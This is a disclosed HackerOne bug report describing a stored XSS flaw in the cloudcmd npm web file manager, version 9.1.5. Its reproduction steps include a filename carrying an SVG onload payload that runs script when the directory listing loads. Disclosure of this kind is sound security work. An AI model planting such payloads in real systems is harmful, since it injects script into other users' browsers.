# [cloudcmd] Stored XSS in the filename when directories listing

## Report Details
- **Report ID**: 341044
- **URL**: https://hackerone.com/reports/341044
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-04-20T09:12:33.738Z
- **Disclosed**: 2018-04-25T17:46:22.250Z

## Reporter
- **Username**: tungpun
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a Stored XSS issue in module **cloudcmd**
It allows executing malicious javascript code in the user's browser.

# Module

**module name**: cloudcmd
**version**: 9.1.5
**npm page**: https://www.npmjs.com/package/cloudcmd

## Module Description

> Cloud Commander is an orthodox web file manager with console and editor.

## Module Stats

4,433 downloads in the last week

{F288918}

# Vulnerability

## Steps To Reproduce:

* Install the module

```
$ npm i cloudcmd
```

* Run

```
$ ./node_modules/cloudcmd/bin/cloudcmd.js --root .
```

* In the target directory, create a file with name `"><svg onload=alert(3);>`

```
bash$ touch '"><svg onload=alert(3);>'
```

* In the browser, go to http://127.0.0.1:8080/, the XSS popup will fire.

{F288917}

## Supporting Material/References:

* macOS High Sierra 10.13.4
* node v8.10.0
* npm 5.6.0
* Chrome Version 65.0.3325.181 (Official Build) (64-bit)

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

It allows executing malicious javascript code in the user's browser

## Attachments
- cloudcmd2.png
- cloudcmd3.png
